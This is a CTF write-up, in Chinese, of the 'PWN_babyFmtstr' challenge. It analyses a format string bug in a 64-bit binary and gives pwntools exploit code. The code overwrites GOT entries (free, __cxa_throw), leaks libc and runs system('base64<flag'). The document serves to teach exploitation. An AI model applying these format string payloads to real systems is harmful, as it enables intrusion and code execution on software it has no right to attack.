
## PWN_babyFmtstr (526pt)
- 题目描述：
  
    > none
- 题目附件：[PWN_babyFmtstr](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/CTFShow-36D/pwn/PWN_babyFmtstr/PWN_babyFmtstr)
- 考察点：格式化字符串
- 难度：一般

### 程序分析
看题目名，应该是个有**格式化字符串漏洞**的题，主函数如下：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3){
  char *ptr; // ST08_8
  char *v4; // ST10_8

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  ptr = fsb();
  v4 = motto();
  printf("your motto is \"%s\"\n", v4);
  free(ptr);
  free(v4);
  return 0LL;
}
```

#### 格式字符串漏洞

其中`fsb`函数中存在格式化字符串漏洞：

```c
char *fsb(){
  char *v0; // ST08_8
  char s; // [rsp+10h] [rbp-40h]
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  sleep(0);
  puts("please input name:");
  read_n((__int64)&s, 0x32uLL);
  v0 = strdup(&s);
  printf("Hello ", 50LL, sleep);
  printf(&s);
  return v0;
}
```

> 可以输入长度小于等于50字节的格式化字符串

#### 程序保护

查看程序保护机制，发现是`Partial RELRO`，因此可以改写GOT表

```c
checksec PWN_babyFmtstr 
[*] '/home/taqini/Downloads/36D/babyfmt/PWN_babyFmtstr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### 解题思路

利用格式化字符串漏洞，将程序末尾的`free`函数的GOT表改写为`main`，让程序重复执行，同时泄漏libc

再次利用格式化字符串漏洞，改某函数GOT表，最终执行`system(cmd)`，拿到flag。

> 这题其实不难，GOT表可改写，再有一个printf就基本上能getshell了。但是比赛的时候我没注意到平台服务器是香港的，用`%Nc%hn`的时候会输出太多空格，导致有时没法正确得到程序输出的数据，所以我选择攻击点的时候就比较保守，格式化字符串中用的也是`%hhn`，一字节一字节改的，导致这题最终的解法有点绕远。。

#### 重复执行+泄漏libc

程序首次执行到`free`时，GOT表中的值(0x4009d6)是`plt+6`，在代码段：

```c
[0x602040] free@GLIBC_2.2.5 -> 0x4009d6 (free@plt+6) ◂— push   5
```

因此，修改`free`的GOT表后两字节，即可将其改为`main`(0x400E93)

```python
fmt0 = '%14c%12$hhn%133c%13$hhn%25$pAAAA'
fmt0+= p64(elf.got['free']+1)+p64(elf.got['free'])
sla('please input name:\n',fmt0)
```

同时，利用`%25$p`，泄漏`main`的返回地址`libc_start_main+243`，随后可以计算出libc基址

```python
data = ru('AAAA')
log.hexdump(data[-14:])
libc_start_main_ret = eval(data[-14:])
info_addr('leak',libc_start_main_ret)
libcbase = libc_start_main_ret - 0x20830
info_addr('libcbase',libcbase)
```

#### getflag

> 签到那题对`cat`、空格等等等等做了过滤，不知道这题有没有，所以选择直接执行`system("base64<flag")`

`main`函数的最后会`free`掉我们输入的字符串，因此最简单的解法就是改`free`的got表为`system`，但是`free`在之前的操作中已经被占用了，所以这里要稍微绕一下。

在格式化字符串漏洞的函数执行过后，有下面这个函数：

```c
char *motto(){
  _QWORD *v0; // rax
  __int64 sz; // [rsp+0h] [rbp-420h]
  char *v3; // [rsp+8h] [rbp-418h]
  char buf; // [rsp+10h] [rbp-410h]
  unsigned __int64 v5; // [rsp+418h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("please input size of motto:");
  sz = get_ll();
  if ( sz < 0 )
    sz = -sz;
  if ( sz > 1024 )
    sz = 1024LL;
  puts("please input motto:");
  read_n((__int64)&buf, sz);
  v3 = strdup(&buf);
  if ( (unsigned __int8)sub_400B96((__int64)&buf) ^ 1 )
  {
    v0 = (_QWORD *)__cxa_allocate_exception(8LL);
    *v0 = "The format of motto is error!";
    __cxa_throw((__int64)v0, (__int64)&`typeinfo for'char const*, 0LL);
  }
  return v3;
}
```

```c
signed __int64 __fastcall sub_400B96(__int64 buf){
  int i; // [rsp+14h] [rbp-4h]
  for ( i = 0; *(i + buf); ++i ){
    if ( *(i + buf) <= 0x1F || *(i + buf) == 0x7F )
      return 0LL;
  }
  return 1LL;
}
```

> 当输入的字符串中出现`0x7f`或是小于`0x1f`的字节时，就会抛出异常。

在不抛出异常的时候，这些异常处理函数是用不到的，所以可以选择修改异常处理函数的GOT表，比如改`__cxa_throw`

```python
system = libcbase + libc.sym['system']
info_addr('system',system)

arg0=(system)&0xff
arg1=(system&0xff00)>>8
arg2=(system&0xff0000)>>16
arg3=(system&0xff000000)>>24
arg4=(system&0xff00000000)>>32
arg5=(system&0xff0000000000)>>40


fmt1 = '%'+str(arg0)+'c%12$hhn%'+str((arg1-arg0+0x100)%0x100)+'c%13$hhn'
fmt1 = fmt1.ljust(32,'B')
fmt1+= p64(elf.got['__cxa_throw'])+p64(elf.got['__cxa_throw']+1)

sl(fmt1)
sl('20')
sl(cyclic(10))

fmt2 = '%'+str(arg2)+'c%12$hhn%'+str((arg3-arg2+0x100)%0x100)+'c%13$hhn'
fmt2 = fmt2.ljust(32,'C')
fmt2+= p64(elf.got['__cxa_throw']+2)+p64(elf.got['__cxa_throw']+3)

sl(fmt2)
sl('20')
sl(cyclic(10))

fmt3 = '%'+str(arg4)+'c%12$hhn%'+str((arg5-arg4+0x100)%0x100)+'c%13$hhn'
fmt3 = fmt3.ljust(32,'C')
fmt3+= p64(elf.got['__cxa_throw']+4)+p64(elf.got['__cxa_throw']+5)

sl(fmt3)
sl('20')
sl(cyclic(10))
```

> 一次改两字节，一共改三次

改完之后还需要去触发这个函数，这个不难，直接再改一次free的got表，改到`__cxa_throw@plt`即可。

```nasm
   0x400a30 <__cxa_throw@plt>:	jmp    QWORD PTR [rip+0x20163a]
   0x400a36 <__cxa_throw@plt+6>:	push   0xb
   0x400a3b <__cxa_throw@plt+11>:	jmp    0x400970
```

> 这样既可以利用`free`的参数`"base64<flag"`，又可以执行`system`

```python
fmt4 = 'base64<flag&&%2595c%12$hnAAAAAAA'+p64(elf.got['free'])
sl(fmt4)
sl('20')
sl('base64<flag')
```

>最后一次了，不需要收数据了，就用的`%hn`

最终，执行`system("base64<flag")`打印flag

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/CTFShow-36D/pwn/PWN_babyFmtstr) 

